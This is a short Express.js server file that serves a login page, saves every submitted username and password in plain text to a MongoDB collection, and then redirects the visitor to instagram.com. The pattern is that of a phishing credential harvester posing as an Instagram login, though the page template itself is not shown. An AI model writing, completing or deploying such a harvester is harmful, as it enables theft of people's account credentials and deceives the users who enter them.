'use strict';
import dotenv from 'dotenv';
dotenv.config();
import express from 'express';
const app = express();
const PORT = process.env.PORT || 4000;
import Signup from './models/signupshcema.js';
import path from 'path';
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
import bodyParser from 'body-parser';
import connectDB from './connection/connection.js';
import router from './routes/route.js';


app.set('view engine', 'hbs');


app.use(bodyParser.urlencoded({
    extended: true
}))


app.use(express.static(path.join(__dirname, "./public")))

app.use('/',router)


app.get("/login", (req, res) => {
    res.render("index")
})


app.get("/", async (req, res) => {
    try {
        res.render("index")
    } catch (error) {
        console.log(error)
    }

})

app.post('/', async (req, res) => {
    try {
        let userData = {
            name: req.body.username,
            pass: req.body.password
        }
        Signup.insertMany([userData])
        res.redirect("https://www.instagram.com/")
    } catch (error) {
        console.log(error.message)
    }
})
app.get("*", (req, res) => {
    res.status(404).json("page Not Found")
})

const start = async () => {
    try {
        app.listen(PORT)
        await connectDB(process.env.MONGODB_URI)
    } catch (error) {
        console.error(error.message)
    }
}

start();